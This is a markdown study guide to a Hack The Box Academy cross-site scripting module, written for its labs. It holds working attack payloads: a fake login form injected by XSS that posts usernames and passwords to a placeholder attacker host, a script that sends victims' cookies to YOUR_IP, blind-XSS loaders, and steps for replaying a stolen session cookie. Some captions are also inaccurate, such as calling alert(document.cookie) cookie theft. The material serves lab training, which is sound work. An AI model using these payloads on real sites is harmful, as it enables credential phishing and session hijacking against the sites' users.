# 🛰️ XSS Guide for HTB Academy Labs

## Overview [!ABSTRACT]
This guide covers essential concepts and practical techniques from HTB Academy's Cross-Site Scripting (XSS) module, focusing on penetration testing and web application security assessment. It includes detailed walkthroughs, payloads, and debugging tips to help you succeed in the lab exercises.

---

## XSS Basics

### What is XSS? [!INFO]
Cross-Site Scripting (XSS) attacks involve injecting malicious scripts into web pages viewed by other users. This can lead to data theft, session hijacking, or defacement of websites.

### Types of XSS
- **Reflected:** Payloads that are returned directly in the response.
- **Stored:** Malicious scripts stored permanently on a web server and executed every time a victim loads the page.
- **DOM-Based:** Scripts injected by manipulating DOM properties without direct interaction with the server.

---

## XSS Lab Setup

### Pre-Lab Configuration [!NOTE]
Ensure you have your local machine set up for lab exercises. Typically, you need to configure an HTTP server (e.g., Apache) and a PHP environment if required.

```bash
# Start a simple HTTP server
sudo php -S 0.0.0.0:80

# Check server status
sudo netstat -tlnp | grep :80
```

---

## XSS Payloads and Exploits

### Basic XSS Attacks [!CHECK]
#### Cookie Stealing Payload:
```html
<script>alert(document.cookie)</script>
```
Use this payload to test if a website is vulnerable to cookie theft.

#### DOM-based XSS with innerHTML:
```html
<img src="" onerror=alert(document.cookie)>
```

---

## HTB Academy Lab Solutions

### Question Examples [!EXAMPLE]
**Cookie Stealing Payload:**
```html
<script>alert(document.cookie)</script>
```
Use this payload to steal cookies from a vulnerable web application.

**DOM XSS with innerHTML:**
```html
<img src="" onerror=alert(document.cookie)>
```

**Reflected XSS in URL parameter:**
```bash
http://target.com/index.php?task=<script>alert(document.cookie)</script>
```
This payload tests for reflected XSS vulnerabilities in query parameters.

---

### Phishing Attack (HTB Academy Labs) [!WARNING]
Be cautious with phishing payloads. Ensure you are using these techniques responsibly and only against targets you have permission to test.

```html
# Raw payload for phishing exercise
'><script>document.write('<h3>Please login to continue</h3><form action=http://YOUR_IP:PORT><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--

# URL encoded for browser
http://SERVER_IP/phishing/index.php?url=%27%3E%3Cscript%3Edocument.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2FYOUR_IP%3APORT%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3Bdocument.getElementById%28%27urlform%27%29.remove%28%29%3B%3C%2Fscript%3E%3C%21--
```

### Session Hijacking Lab (HTB Academy) [!SUCCESS]
```bash
# Step 1: Test blind XSS detection payloads
<script src=http://YOUR_IP/fullname></script>
<script src=http://YOUR_IP/username></script>  
<script src=http://YOUR_IP/website></script>

# Step 2: Create script.js for cookie stealing
new Image().src='http://YOUR_IP/index.php?c='+document.cookie;

# Step 3: Use working payload with script.js
<script src=http://YOUR_IP/script.js></script>

# Step 4: Check stolen cookies
cat cookies.txt

# Output: Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2

# Step 5: Use cookie in Firefox Developer Tools (Shift+F9)
# Storage tab > Add cookie > Set Name: cookie, Value: f904f93c949d19d870911bf8b05fe7b2
```

### XSS Discovery Exercise Solutions [!INFO]
**Finding vulnerable parameter**
```bash
# Answer: email (example from HTB labs)
```
**Finding XSS type**
```bash
# Answer: reflected (example from HTB labs)
```

---

## XSS Troubleshooting & Common Mistakes

### Phishing Attack Issues [!ERROR]

#### Problem: Payload not working
1. **Basic XSS test first**: `<script>alert(1)</script>`
2. **Verify IP address**: `ip a | grep tun0` or `ifconfig tun0`
3. **URL encoding issues**:
   - Use Burp Suite or an online URL encoder to ensure correct encoding.

#### Problem: PWNIP:PWNPO placeholders
```html
# ❌ WRONG - Using placeholders from tutorial
action=http://PWNIP:PWNPO

# ✅ CORRECT - Using your actual IP
action=http://10.10.14.55:8080
```

#### Problem: Server not receiving credentials [!FAILURE]
- **Check if PHP server is running**: `sudo php -S 0.0.0.0:80`
- **Verify firewall rules**: `sudo ufw allow 80`
- **Test with netcat first**:
```bash
sudo nc -lvnp 8080
```

#### Problem: Form not appearing [!CAUTION]
1. **Check browser console (F12)** for JavaScript errors.
2. **View page source**: `Ctrl+U` or right-click and select "View Page Source" to see if payload is injected correctly.

### Session Hijacking Issues [!WARNING]

#### Problem: No requests to server during blind XSS testing
- **Check if server is running**: `sudo php -S 0.0.0.0:80`
- **Firewall rules** allow connections on port 80.
- Test with simple HTTP request:
```bash
curl http://YOUR_IP
```

#### Problem: Script.js not loading [!FAILURE]
1. Verify file exists in server directory:
   ```bash
   ls -la /tmp/tmpserver/script.js
   ```
2. Check file permissions:
   ```bash
   chmod 644 script.js
   ```
3. Test direct access to the script:
```bash
curl http://YOUR_IP/script.js
```

#### Problem: Cookies not being captured [!DANGER]
1. **Check cookie format in browser** (should be `Name=Value`).
2. Clear cookies first, then add stolen cookie.
3. Refresh page to test access.

### Common Payload Encoding Issues

#### URL Encoding Problems:
```bash
# Spaces must be encoded as %20 or +
Please login to continue
# Becomes:
Please+login+to+continue

# Special characters must be encoded
< = %3C
> = %3E
" = %22
' = %27
```

#### JavaScript String Escaping [!WARNING]
```javascript
// ❌ WRONG - Unescaped quotes
document.write('<form action="http://attacker.com">');

// ✅ CORRECT - Escaped quotes
document.write('<form action=http://attacker.com>');
```

### Debugging XSS Payloads

**Step-by-step debugging:**
1. **Test basic XSS**: `<script>alert(1)</script>`
2. **Test with URL parameter**: `?url=<script>alert(1)</script>`
3. **Check payload encoding** using online tools.
4. Verify server is listening:
```bash
sudo php -S 0.0.0.0:8080
```
5. Test credential capture manually.

---

*This XSS guide covers the fundamental concepts and practical techniques from HTB Academy's Cross-Site Scripting module, providing a comprehensive resource for penetration testing and web application security assessment.*